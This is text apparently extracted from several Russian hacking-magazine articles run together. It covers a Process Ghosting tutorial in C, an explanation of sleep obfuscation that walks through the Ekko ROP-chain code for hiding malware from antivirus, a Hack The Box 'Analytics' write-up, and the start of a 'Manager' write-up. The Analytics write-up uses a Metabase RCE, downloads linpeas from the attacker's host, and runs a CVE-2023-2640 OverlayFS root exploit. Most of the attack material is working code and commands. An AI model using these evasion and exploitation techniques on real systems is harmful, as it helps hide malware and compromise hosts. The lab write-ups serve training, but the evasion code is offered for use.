NTSTATUS status = NtOpenFile(&hTempFile,
  DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
  &attributes,
  &io_stat_block,
  FILE_SHARE_READ | FILE_SHARE_WRITE,
  FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
);


if (!NT_SUCCESS(status)) return INVALID_HANDLE_VALUE;

Те перь необходимо пометить файл как при готовленный к удалению. Для это-
го будем исполь зовать функцию NtSetInformationFile, задав зна чение пос-
ледне го  аргумента  как  FileDispositionInformation.  Таким  образом
нашему фай лу будет присвоен флаг DeletePending. С этого момента операци-
онная система будет готова сразу удалить файл, как только закроется его
дес криптор.


FILE_DISPOSITION_INFORMATION info = { 0 };
info.DeleteFile = TRUE;


status = NtSetInformationFile(hTempFile, &io_status_block, &info,
sizeof(info), FileDispositionInformation);


if (!NT_SUCCESS(status)) return INVALID_HANDLE_VALUE;

Те перь пишем наш код (функция NtWriteFile), который хотим выпол нить
в обход средств монито ринга, в созданный времен ный файл.


LARGE_INTEGER offset = { 0 };


status = NtWriteFile(
  hTempFile,
  NULL,
  NULL,
  NULL,
  &status_block,
  // Буфер с нашей полезной нагрузкой
  myCodeBuf,
  // Размер полезной нагрузки
  myCodeSize,
  &offset,
  NULL
);


if (!NT_SUCCESS(status)) return INVALID_HANDLE_VALUE;

Из нашего вре менного файла создаем объект «секция» при помощи вызова
функции NtCreateSection. Не забываем про пра вильные аргументы фун-
кции: PAGE_READONLY и SEC_IMAGE, которые будут указывать на то, что мы
работа ем с исполняемым файлом обра за.


status = NtCreateSection(&hSection,
  SECTION_ALL_ACCESS,
  NULL,
  0,
  PAGE_READONLY,
  SEC_IMAGE,
  // Создаем секцию из временного файла
  hTempFile
);


if (status != STATUS_SUCCESS) return INVALID_HANDLE_VALUE;

Сей час мы можем  закрыть  дескриптор  времен ного файла  (вызовом
NtClose).  Пос кольку  наш  временный  файл  был  соз дан  с  флагом
DeletePending (ожи дающий удаления), то закрытие дес криптора приводит
к немедленному удалению файла силами ОС.


NtClose(hTempFile);

Создаем процесс из нашей сек ции. В результате получим хендл нового про-
цесса, который будем использовать далее для создания потока внутри
нашего процесса.


status = NtCreateProcessEx(
  &hProcess,
  PROCESS_ALL_ACCESS,
  NULL,
  NtCurrentProcess(),
  PS_INHERIT_HANDLES,
  // Наша секция, которую мы создали на предыдущем шаге
  hSection,
  NULL,
  NULL,
  FALSE
);


if (status != STATUS_SUCCESS) return 1;

Далее, что бы наш поток смог запус титься в ОС, мы должны настроить PEB
и настроить параметры про цесса.
  Сначала займемся парамет рами:


UNICODE_STRING ImagePath = { 0 };
UNICODE_STRING DllPath = { 0 };
wchar_t curDirPath[MAX_PATH] = { 0 };
UNICODE_STRING CurrentDirectory = { 0 };
UNICODE_STRING WindowTitle = { 0 };


wchar_t dllSystemDir[] = L"C:\\Windows\\System32";
wchar_t* windowTitle = (LPWSTR)L"Calculator";
PRTL_USER_PROCESS_PARAMETERS pProcessParams = nullptr;
LPVOID Environment;


RtlInitUnicodeString(&ImagePath, victimPath);


GetCurrentDirectoryW(MAX_PATH, curDirPath);


RtlInitUnicodeString(&CurrentDirectory, curDirPath);
RtlInitUnicodeString(&DllPath, dllSystemDir);
RtlInitUnicodeString(&WindowTitle, windowTitle);


CreateEnvironmentBlock(&Environment, NULL, TRUE);


NTSTATUS status = RtlCreateProcessParametersEx(
  &pProcessParams,
  (PUNICODE_STRING)&ImagePath,
  (PUNICODE_STRING)&DllPath,
  (PUNICODE_STRING)&CurrentDirectory,
  (PUNICODE_STRING)&ImagePath,
  Environment,
  (PUNICODE_STRING)&WindowTitle,
  nullptr,
  nullptr,
  nullptr,
  RTL_USER_PROC_PARAMS_NORMALIZED
);
if (status != STATUS_SUCCESS) return 1;

Запишем параметры в процесс (опус каю бесконечные if, нужные для провер-
ки кор рек тности вызовов):


VirtualAllocEx(hProcess, (LPVOID)pProcessParams, pProcessParams->
Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProcess, (LPVOID)pProcessParams, (LPVOID)
pProcessParams, pProcessParams->Length, NULL);
VirtualAllocEx(hProcess, (LPVOID)pProcessParams->Environment,
pProcessParams->EnvironmentSize, MEM_COMMIT | MEM_RESERVE,
PAGE_READWRITE);
WriteProcessMemory(hProcess, (LPVOID)pProcessParams->Environment, (
LPVOID)pProcessParams->Environment, pProcessParams->EnvironmentSize,
NULL);

Те перь настроим PEB. На самом деле это стандар тная процедура, применя-
емая при запус ке подоб ных про цессов через NtCreateProcessEx и подоб-
ные фун кции. Такое встречается в любом коде, она не харак терна именно
для Process Ghosting.


PEB peb_struct = { 0 };
PROCESS_BASIC_INFORMATION pbi = { 0 };
SIZE_T count = 0;
DWORD RetLen = 0;


status = NtQueryInformationProcess(
  hProcess,
  ProcessBasicInformation,
  &pbi,
  sizeof(PROCESS_BASIC_INFORMATION),
  &RetLen
);


if (status != STATUS_SUCCESS) return 1;


ULONGLONG pebBaseAddress = (ULONGLONG)pbi.PebBaseAddress;
ULONGLONG param_offset = (ULONGLONG)&peb_struct.ProcessParameters - (
ULONGLONG)&peb_struct;
LPVOID new_image_base = (LPVOID)(pebBaseAddress + param_offset);


if (!WriteProcessMemory(hProcess, new_image_base,
  &pProcessParams, sizeof(PVOID),
  &count))
  return 1;

Создаем  первый  поток  в  нашем  процессе  при  помощи  функции
NtCreateThreadEx.


status = NtCreateThreadEx(&hThread,
  THREAD_ALL_ACCESS,
  NULL,
  hProcess,
  (LPTHREAD_START_ROUTINE)processEntryPoint,  // Вычисляем его по
формуле processEntryPoint = PEB.ImageBaseAddress + EntryPoint нашего
внедряемого кода
  NULL,
  FALSE,
  0,
  0,
  0,
  NULL
);


if (status != STATUS_SUCCESS) return 1;


ÂÛÂÎÄÛ

Вот ты и научился запускать процес сы при помощи Process Ghosting! Но рас-
слаблять ся рано. Методы скрытия выполнения кода — это только один
из шагов к тому, что бы добиться полноцен ной невидимос ти. Кроме того,
именно этот метод оставляет в памяти некото рые артефакты, но его мож но
скре щивать с другими техниками, чтобы избежать обна руже ния. В общем, мы
еще про должим эту тему!
ВЗЛОМ





Вирусо писатели придумывают все новые
и новые спо собы скрытия своего ПО пос ле
инжекта в про цесс. В последнее вре мя ста-
ла  популярна  не  просто  обфуска ция,
а  Sleep-обфуска ция. Давай  разберемся         MichelleVermishelle                                                                                       @Michaelzhm
с этой  техникой, познакомимся с ROP-        michael.zhmailo@yandex.ru
цепоч ками, если ты с ними еще не знаком,
и заценим публично доступные PoC.


Какую глав ную цель прес леду ет любой уважающий себя зловред? Быть
может, заработать создателю миллион долларов? Захватить весь мир? Ста-
щить нюдсы быв шей? Все это может быть потом, но пер вая и важ нейшая
задача — скрыться! И Sleep-обфуска ция в этом отлично помогает. Этот спо-
соб скры тия может при меняться как к шелл-коду, так и ко всей копии файла
в памяти в целом.
   Большинство антивирусов обращает пристальное вни мание на любые
области памяти с правами на исполнение. Конечно, не все так просто, важно
верно учи тывать реги он памяти (глу по было бы блокиро вать все RX-данные
в Image-сек циях), но Sleep-обфускация не об этом.
  Представь, что сканер так и рыщет злыми глазами по памяти уже заражен-
ного про цесса, пыта ясь выцепить своими когтищами наш бедный малень кий
шелл-код. Чтобы скрыть себя в памяти, он может взять и поменять раз-
решения  своего  реги она  с  RX  на,  нап ример, RW  или  вообще
PAGE_NO_ACCESS. После чего дополнительно пок сориться на удачу. И всё,
шелл-код в домике. А Око Касперско го останется ни с чем.
  Собственно, эту задачу и решает Sleep-обфускация. Она поз воля ет изме-
нить разрешения памяти, спрятать шелл-код, а затем через некоторое вре мя
вернуть его к жизни путем рас шифровки и вос ста новления Execute-прав.
  Предлагаю сразу разоб рать ся с терминами. Поспрашивав экспертов
и пог лядев PoC на GitHub, я смело заявляю, что Sleep-обфускацию можно
считать подвидом флук туации шелл-кода. Флуктуация решает ту же задачу —
шиф рование и изме нение раз решений. Но лично я счи таю, что Sleep-
обфускация — это все то, что при водит, используя те же таймеры (или иные
механизмы, связан ные со временем), к выстрелу кол бэка и последу юще му
изме нению раз решений памяти.
   Флук туация — это кон цепция такого поведения вредоноса в целом.
Добить ся флуктуации можно и без времен ных фун кций. Можно в шелл-коде
раз местить PAGE_GUARD или Hardware Breakpoint. Такой фокус при выпол-
нении шелл-кодом кон кретной инс трукции поз волит активировать колбэк,
который спрячет вредонос в памяти.


ROP

Почти все известные PoC на «спящую» обфускацию используют ROP-цепоч-
ки. Если очень вкратце, то ROP-цепочки считаются некоторой прод винутой
заменой стандартно му переполнению буфера. Вмес то того чтобы помещать
где-то в сте ке наш шелл-код, мы, манипу лируя адресами возврата, заставля-
ем код выполнять необходимые нам инструкции. Набор инструк ций называ-
ется ROP-гаджетом, нес колько ROP-гаджетов — ROP-цепочкой.
  Отличная картинка, наг лядно пред ставляющая этот механизм, есть в блоге
ka1d0.





                 Наглядная иллюстра ция ROP-цепочки




                      Больше про этот интересный способ эксплуата-
                      ции можно почитать тут:
                     •Решение задания с pwnable.kr 26 — ascii_easy.
                        Разбираемся  с ROP-гаджетами  с  нуля  раз
                       и навсегда
                      •ROP-цепоч ки и гаджеты: учимся разрабаты вать
                          экс плойты
                        •Return Oriented Programming (ROP) attacks
                          •32-bit Stack-based Buffer Overow
                     •What is the difference between a buffer overow
                             attack and a ROP attack?


Впро чем, погружаться в самые дебри нам сегод ня не понадо бится. Связь
между Sleep-обфускацией и ROP основана только на том, что после выпол-
нения одной функции автоматичес ки будет дергать ся другая. Вот и всё!
Давай посмотрим на примере.


EKKO

Прос тейший и самый наг лядный PoC для демонс тра ции Sleep-обфускации —
это Ekko. У него есть и более продвинутый вари ант, но он не столь наглядный,
и разобраться с ним будет слож нее.
   Ekko позволяет, как нам и требуется, изменить разрешение памяти
с  помощью  функции  VirtualProtect(),  а  зашиф ровать  пейлоад  через
SystemFunction032. SystemFunction032 — это недокумен тированная фун-
кция Windows, впрочем, работа ет она донельзя прос то: мы передаем ей блок
данных,  а  она  его шиф рует. В  осно ве  функции  лежит  XOR.  Есть
еще SystemFunction033() — ее механизм тот же.


NTSTATUS WINAPI SystemFunction032(struct ustring *  data,const struct
ustring *key)

Парамет ров, как видишь, всего два:
 • data — сюда пада ет адрес структуры RC4_CONTEXT, которая содержит
   данные для шифрования или расшифров ки;
 • key — сюда падает адрес клю ча, который мож но использовать для рас-
  шифровки либо шифрования.

При меры кода для шиф рования с использованием этих функций ты найдешь
в бло ге Осанды Джайятиссы.
   У Ekko же всего одна-единственная функция — EkkoObf(). Она принимает
лишь один DWORD-параметр — вре мя, на которое наш исполняемый файл
уснет. Спрячется все адресное пространство, содержащее код исполняемо-
го файла.
  Сначала инициали зиру ется ключ, с помощью которого будет про исходить
шиф рование.


CHAR    KeyBuf[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
USTRING Key = { 0 };
USTRING Img = { 0 };

Так как у нас Sleep-обфуска ция, нужно создать некото рое событие и таймер,
который поз волит «выстрелить» в опре деленный момент и спрятать либо вер-
нуть наружу нашу нагрузку. Для это го Ekko использует стандар тные функции
CreateEventW() и CreateTimerQueue().
  Функция CreateTimerQueue() поз воля ет создать очередь  тай меров,
которые будут вызывать ся друг за другом. Эта цепочка сыграет свою клю-
чевую роль чуть позже.


hEvent = CreateEventW(0, 0, 0, 0);
hTimerQueue = CreateTimerQueue();

Следующим шагом Ekko получает указатели на адре са ранее опи санной фун-
кции SystemFunction032()  и  новой  для  нас  NtContinue(). Функция
NtContinue() также не документирова на. Ее предназначение чуть сложнее —
она при нима ет спе циаль ную структуру CONTEXT, которая содержит значения
регистров. Переда вая эту структуру в функцию, мы можем возобновить
выполнение текущего потока с ука занными в структуре CONTEXT изменениями
в регистрах.
  Нап ример, зна чение регистра EAX равно  10. Переда ем в функцию
NtContinue() структуру CONTEXT со значением EAX  20, и EAX в нашем
потоке становится равен 20.
  Именно на этих функциях и строится ROP-цепочка. Чтобы шиф ровать весь
наш файл в памяти, происходит получение его базового адреса загрузки
через GetModuleHandle().


ImageBase   = GetModuleHandleA( NULL );
ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( ImageBase + ( (
PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.
SizeOfImage;

Наконец, сама ROP-цепочка выглядит так.


 if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (
WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread, 0, 0,
WT_EXECUTEINTIMERTHREAD))
 {
  WaitForSingleObject(hEvent, 0x32);


  memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
  memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
  memcpy(&RopDelay, &CtxThread, sizeof(CONTEXT));
  memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
  memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
  memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));


  // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &
OldProtect );
  RopProtRW.Rsp -= 8;
  RopProtRW.Rip = (DWORD64)VirtualProtect;
  RopProtRW.Rcx = (DWORD64)ImageBase;
  RopProtRW.Rdx = ImageSize;
  RopProtRW.R8 = PAGE_READWRITE;
  RopProtRW.R9 = (DWORD64)&OldProtect;


  // SystemFunction032( &Key, &Img );
  RopMemEnc.Rsp -= 8;
  RopMemEnc.Rip = (DWORD64)SysFunc032;
  RopMemEnc.Rcx = (DWORD64)&Img;
  RopMemEnc.Rdx = (DWORD64)&Key;


  // WaitForSingleObject( hTargetHdl, SleepTime );
  RopDelay.Rsp -= 8;
  RopDelay.Rip = (DWORD64)WaitForSingleObject;
  RopDelay.Rcx = (DWORD64)NtCurrentProcess();
  RopDelay.Rdx = SleepTime;


  // SystemFunction032( &Key, &Img );
  RopMemDec.Rsp -= 8;
  RopMemDec.Rip = (DWORD64)SysFunc032;
  RopMemDec.Rcx = (DWORD64)&Img;
  RopMemDec.Rdx = (DWORD64)&Key;


  // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &
OldProtect );
  RopProtRX.Rsp -= 8;
  RopProtRX.Rip = (DWORD64)VirtualProtect;
  RopProtRX.Rcx = (DWORD64)ImageBase;
  RopProtRX.Rdx = (DWORD64)ImageSize;
  RopProtRX.R8 = PAGE_EXECUTE_READWRITE;
  RopProtRX.R9 = (DWORD64)&OldProtect;


  // SetEvent( hEvent );
  RopSetEvt.Rsp -= 8;
  RopSetEvt.Rip = (DWORD64)SetEvent;
  RopSetEvt.Rcx = (DWORD64)hEvent;


  puts("[INFO] Queue timers");


  CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK
)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
  CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK
)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
  CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK
)NtContinue, &RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
  CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK
)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
  CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK
)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
  CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK
)NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);


  puts("[INFO] Wait for hEvent");


  WaitForSingleObject(hEvent, INFINITE);


  puts("[INFO] Finished waiting for event");
  printCurrentTime();
 }


 DeleteTimerQueue(hTimerQueue);
}

Здесь сначала соз даем тай мер, который сра зу же запускается и получает
контекст текуще го потока. Контекст — это как раз та структура CONTEXT
со зна чениями регистров. После чего копируем  этот контекст во все
перемен ные, которые будут содержать изменения.
  Далее запол няем в каж дой струк туре элемен ты так, чтобы они вызыва ли
нуж ные функции и ROP-цепоч ка корректно отрабатывала. В нашем случае
структуры запол няются так, чтобы шел вызов в такой последова тель нос ти:
VirtualProtect() → изменение с RWX на RW → SystemFunction032() →
шиф рование →  спим   столь ко,  сколько   ука зано   в  функции →
SystemFunction032() → расшифровка → VirtualProtect() → изменение
с RW на RWX.
  Для вызова ROP-цепоч ки регистрируются таймеры, которые по исте чении
вре мени вызывают фун кцию NtContinue() со структурами CONTEXT.


CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)
NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)
NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)
NtContinue, &RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)
NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)
NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)
NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);

Че рез 100 миллисекунд выстрелива ет первый гаджет, память с нашим фай-
лом становится RW; через 200 миллисекунд все в памяти шифруется;
через 300 ожидаем событие, которое перей дет в сигнальное состояние
через указанное функци ей время для сна; через 400 произойдет рас шифров-
ка, а через полови ну секунды память вновь ста нет RWX.
  Ло гичный воп рос — каким обра зом сис тема вызывает функции, если мы
как бы шиф руем всю память? Здесь идет шифрование только непос редс-
твен но кода прог раммы, смап ленной в память. При этом DLL, в которых
находится реали зация функций NtContinue(), SystemFunction032() и так
далее, не шифруется. Поэто му все успешно исполняется, ведь мы регис три-
руем кол бэки, указывая адреса этих функций. Система эти адреса запоми-
нает, и они не под вергаются шифрованию при работе пей лоада (так как они
находят ся за пре делами ImageBaseAddr + ImageSize). Поэто му все отлично
сра баты вает.


ÂÛÂÎÄÛ

Те перь нам понятен основной смысл работы Sleep-обфускации, но Ekko —
лишь один из простей ших PoC. На GitHub их мно го разновид ностей: здесь
и RustChain с исполь зованием в логике хардверных брейк-пойнтов, и Cronos
с SleepEx(), и DeathSleep. Последний метод мож но счи тать продвинутой
Sleep-обфускацией, поскольку он буквально убивает текущий поток (но
перед этим предварительно не забыва ет сохранить все регис тры CPU
для него и стек), затем спит, после чего вос станавливает данные. В общем,
теперь у тебя огромный простор для самостоятель ного изу чения!
ВЗЛОМ





В этом райтапе я покажу про цесс экс плу-
атации уяз вимости CVE-2023-2640 в фай-
ловой сис теме OverlayFS для Linux, но сна-
чала нам нужно будет ата ковать систему
Metabase, чтобы получить дос туп к хосту.                   RalfHacker                                                                                             hackerralf8@gmail.com

Наша цель — получение прав суперпользователя на машине Analytics с учеб-
ной площадки Hack The Box. Уро вень машины — лег кий.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.233    analytics.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Скрипт нашел всего два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб-сервер Nginx 1.18.0.

Сра зу идем изу чать веб.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÎÏÎÐÛ

Сайт однос траничный, одна ко при выборе пункта Login в навигации сайта нас
переносит на новый домен: data.analytical.htb.





                 Ошибка обра щения к домену

Добав ляем новый домен в файл /etc/hosts и обновляем страницу. Нас
встре чает форма авто риза ции Metabase.


10.10.11.233   analytics.htb analytical.htb data.analytical.htb





                Форма авто ризации Metabase

Metabase — это опенсор сный инструмент для бизнес-аналитики, в котором
можно писать зап росы к данным, визуализировать резуль таты на даш бордах,
а также настраивать встроенную систему оповещений для отправки уведом-
лений об изме нениях в Slack или на почту.
  Первым делом сто ит про верить, есть ли для обна руженной плат формы
готовые эксплоиты. Проще и эффективнее всего искать их в Google (хотя заг-
лянуть на HackerOne, в Exploit-DB и на GitHub тоже стоит). Даже если не най-
дутся эксплоиты, иногда можно обнаружить ресерчи с подробным описанием
уязвимос тей.





                   По иск экспло итов в Google

Не дав но в Metabase была обнаруже на уяз вимость CVE-2023-38646, которая
позволя ет ата кующе му выполнить произволь ный код в сис теме и при этом
не про ходить аутен тифика цию в самой плат форме. Как ука зано в блоге
ресерчера,  у Metabase есть специаль ный  токен, который использует ся
для завершения уста новки. Этот токен дос тупен неаутентифици рованным
поль зовате лям, если после уста нов ки платформы обратиться к конечной точ-
ке API /api/session/properties.
  Затем на эта пе уста новки пред лага ется указать источник данных или базу
для соединения JDBC через API /api/setup/validate. Вот тут в эксплоитах
и исполь зует ся спе циальный INIT-сценарий для получе ния RCE. Но вруч ную
выполнять все это нам не придется, пос кольку в базе Metasploit нашелся
готовый эксплоит: exploit/linux/http/metabase_setup_token_rce.


msfconsole
use exploit/linux/http/metabase_setup_token_rce





            Справ ка по экс пло иту metabase_setup_token_rce

Установим такие парамет ры,  как локальные интерфейс и порт  (LHOST
и LPORT), удаленные хост и порт (RHOSTS и RPORT) и адрес, указыва емый
в заголовке HOST (VHOST). Затем запус каем эксплоит и получа ем сессию
от имени поль зователя metabase.


set LPORT 4321
set LHOST tun0
set RHOSTS http://data.analytical.htb
set RPORT 80
set VHOST data.analytical.htb
run





                   Резуль тат работы эксплоита

Пе реходим к этапу прод вижения к другому поль зователю.


ÏÐÎÄÂÈÆÅÍÈÅ

Те перь нам необходимо соб рать информацию. Я для этого, как обычно, буду
использовать скрипты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.



Скачиваем скрипт для Linux.


wget https://github.com/carlospolop/PEASS-ng/releases/latest/
download/linpeas.sh -O /tmp/linpeas.sh

Те перь нужно загрузить его на удаленный хост. Для этого на сво ем хос те
запускаем простенький веб-сер вер:


python3 -m http.server 80

При помощи wget на целевой машине скачива ем скрипт с нашего хос та. Пос-
ле заг рузки необходимо дать право на выполнение и выпол нить скрипт.


wget 10.10.16.19/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh

В выводе будет мно го информации, поэтому отбираем только то, что потен-
циально может при вести нас к повышению привилегий.
   LinPEAS сразу же определил, что мы находим ся в «Докере», а значит,
для выхода из него нужно искать учетные дан ные либо небезопасные нас-
тройки.





                   Информация о кон тейнере

В переменных окружения хранится не только путь к базе данных Metabase,
но и учетные данные.





                    Перемен ные окружения

Пробуем исполь зовать их на SSH и получа ем дос туп к основной системе.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Так как сме нился кон текст и мы попали в новую сис тему, для сбора информа-
ции сно ва загружаем и запус каем LinPEAS. Но в этот раз не уда лось найти
совершенно ничего.
  В таких случаях сто ит некото рое вре мя отслеживать запускаемые в сис-
теме программы и скрип ты. Для отслеживания я рекомендую исполь зовать
утилиту pspy64. Однако я подож дал минут пять, и она ничего не поймала.
  Последнее, на что осталось рассчитывать, — это какие-то све жие экс пло-
иты для самой системы. Узнать точную версию сис темы можно командой
uname -a.





                  Версия используемой системы

По обык новению ищем эксплоиты в Google. Пер вая же ссылка ведет к уяз-
вимос ти GameOverlay.





                   По иск экспло итов в Google

OverlayFS — это объ единенная файловая система, которая накладыва ет
одну файловую систему поверх другой, поз воляя модифициро вать фай лы
без изме нения базовой файловой системы (при мерно как Docker). Однако
эта тех нология пре доставляет пользователям воз можность копировать фай-
лы из вложенного катало га в родительский, сох раняя при этом метаданные
файла, в том числе S-бит. Именно этот недос таток позволяет выполнить
повыше ние привиле гий до рута в базовой сис теме. Способ экс плуатации
этой уяз вимос ти осно ван и на Linux Capabilities.




В Linux пользователь root получа ет особый контекст при запуске любых про-
цессов. Так, ядро и приложения, работающие от име ни root, обычно пропус-
кают любые ограниче ния, заданные на действия в опре деленном контексте,
поэтому root может делать все, что захочет. Но что, если опре деленному про-
цессу, который работает в неп ривилегированном контексте, нужно выполнить
требующее привиле гий действие, не повышая уров ня прав?
  Нап ример, бывает нужно позволить про цессу произво дить запись в жур-
нал аудита ядра, но не позволять отключить этот аудит. Ведь если запустить
этот процесс в кон тексте рута, он сможет выпол нить оба действия!
   Тут на помощь и приходят Linux Capabilities. Эти «возможности» предос-
тавляют процессу не все мно жество привилегий, а какое-то его подмножес-
тво. Другими словами, все привилегии рута разбиваются на более мелкие
незави симые друг от друга привилегии и процесс получает только  те,
которые ему нужны.



Эксплуатация уязвимости заключается в том, что можно создать файл
с минимальными возможностями в одном слое и скопировать его с неог-
раниченными воз можностями в другой слой, что, по сути, позволит фай лу
работать в контексте рута.
  Первым делом перей дем в пользовательское пространство, так как уста-
нав ливать воз можности фай ла и монтировать фай ловую сис тему OverlayFS
можно толь ко там.


unshare -rm sh

Затем для слоев соз даем отдельные каталоги и копиру ем исполня емый файл
python3, после чего даем ему возможность cap_setuid+eip. Она поз воляет
про цессу изме нить UID во время выполнения.


mkdir lower upper workdir mount
cp /usr/bin/python3 lower/
setcap cap_setuid+eip lower/python3

Те перь монтируем файловую систему OverlayFS и изменяем метадан ные
файла, что бы ядро копировало его в верхний каталог с сохранением установ-
ленных воз можностей.


mount -t overlay overlay -o rw,lowerdir=lower,upperdir=upper,workdir=
workdir mount
touch mount/*
exit

Пос ле выхода из пользовательско го пространс тва проверяем воз можности
созданного файла upper/python3.


getcap upper/python3





                     Экс плуата ция уяз вимости

Те перь сде лаем так, чтобы скрипт на Python устанавливал своему процессу
UID,  равный  нулю,  чтобы  получить  при вилегированный  контекст  рута.
Это можно сде лать с помощью функции setuid из модуля os. Затем вызыва-
ем командную обо лоч ку в уже привилегиро ванном контексте с помощью фун-
кции system из того же модуля.


upper/python3


import os
os.setuid( 0)
os.system("/bin/bash")





                           Флаг рута

Мы получаем доступ к bash от имени рута, а значит, машина зах вачена!
ВЗЛОМ





В этом райтапе я покажу, как зло умыш-
ленник   может   повысить   привилегии
при помощи  техники ESC7 и  захватить
домен  через  Active  Directory  Certicate
Services. Но преж де займемся разведкой:             RalfHacker                                                                                             hackerralf8@gmail.com
просканируем ресурсы SMB, извлечем дан-
ные из MS SQL и через фун кцию просмотра
катало гов добудем учет ные дан ные поль-
зователя.


Наша цель — получение прав суперпользователя на машине Manager с учеб-
ной площадки Hack The Box. Операци онная система — Windows, уровень
сложности — средний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.236   manager.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

По результатам сканирования имеем мно го откры тых пор тов, что типич но
для Windows-серверов:
 • 53 — служба DNS;
 • 80 (HTTP) — веб-сервер Microsoft IIS/10.0;
 • 88 — служба Kerberos;
 • 135 — служба удаленного вызова про цедур (Microsoft RPC). Используется
   для опе раций взаимо дей ствия контроллер — контроллер и контроллер —
   кли ент;
 • 139 — служба сеан сов NetBIOS, NetLogon;
 • 389 — служ ба LDAP;
 • 445 — служба SMB;
 • 464 — служба сме ны пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — использует ся в служ бах DCOM и MS Exchange;
 • 636 — LDAP с шиф рованием SSL или TLS;
